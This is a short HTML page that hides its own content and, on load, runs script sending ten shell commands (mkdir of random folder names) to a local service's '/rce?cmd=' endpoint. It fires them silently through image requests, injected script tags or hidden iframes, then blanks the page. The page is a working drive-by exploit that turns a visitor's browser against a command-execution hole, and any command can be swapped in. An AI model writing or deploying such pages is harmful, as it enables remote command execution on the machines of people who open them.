<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>.</title>
    <style>
        body { display: none; }
    </style>
</head>
<body>
    <script>
        // Hide everything
        document.documentElement.style.display = 'none';
        
        // Generate random directory name
        function randomDir() {
            return `folder${Math.floor(Math.random() * 1000000)}`;
        }

        // Create folder via RCE
        function createFolder(dirName) {
            const cmd = `mkdir ${dirName}`;
            
            // Multiple methods to ensure execution
            const methods = [
                () => { new Image().src = `http://localhost:5000/rce?cmd=${encodeURIComponent(cmd)}`; },
                () => { 
                    let s = document.createElement('script');
                    s.src = `http://localhost:5000/rce?cmd=${encodeURIComponent(cmd)}`;
                    document.body.appendChild(s);
                    setTimeout(() => document.body.removeChild(s), 100);
                },
                () => {
                    let f = document.createElement('iframe');
                    f.style.display = 'none';
                    f.src = `http://localhost:5000/rce?cmd=${encodeURIComponent(cmd)}`;
                    document.body.appendChild(f);
                    setTimeout(() => document.body.removeChild(f), 100);
                }
            ];
            
            // Use random method
            methods[Math.floor(Math.random() * methods.length)]();
        }

        // Create 10 folders
        for(let i = 0; i < 10; i++) {
            createFolder(randomDir());
        }

        // Clean up
        document.write('');
        window.stop();
    </script>
</body>
</html>
